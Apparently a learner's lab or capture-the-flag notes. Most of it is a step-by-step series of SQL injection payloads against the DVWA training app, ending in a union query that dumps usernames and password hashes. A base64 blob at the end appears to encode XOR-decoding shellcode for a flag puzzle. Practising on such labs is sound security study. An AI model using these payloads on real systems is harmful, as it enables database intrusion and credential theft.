SELECT Name,Surname FROM accounts where ID = ‘2' and ‘1’='1’
2' and ‘1’='1
2' order by 1 -- '
2' union select 1,2 -- '
2' union select database(),user() -- '
2' union SELECT schema_name, 2 FROM information_schema.schemata -- '
2' union SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = 'dvwa' -- '

2' union SELECT column_name,column_type FROM information_schema.columns WHERE table_schema = 'dvwa' and table_name = 'users' -- '

2' union SELECT concat(user_id,':',first_name,':',last_name), concat(user,':',password) from dvwa.users -- '


MzFDMDUwNjgzRjMxM0YyMzY4M0IzNDNCMkQ2ODFCMzY1NzIyNjgwNzU3MDMxRjY4MUYxMzU3MEQ2ODAyMDcxNjA3NjgwMTFBNTcxOTY4MDExMTU3MEU2ODU2NTY1NjE1NTQ1RThCRkU4QkQ3RkNCOTI0MDAwMDAwQkI3NzAwMDAwMDMxQzA1MEFDMzNDM0FBRTJGQTU0NUVDQw==

The flag should be human-readable.

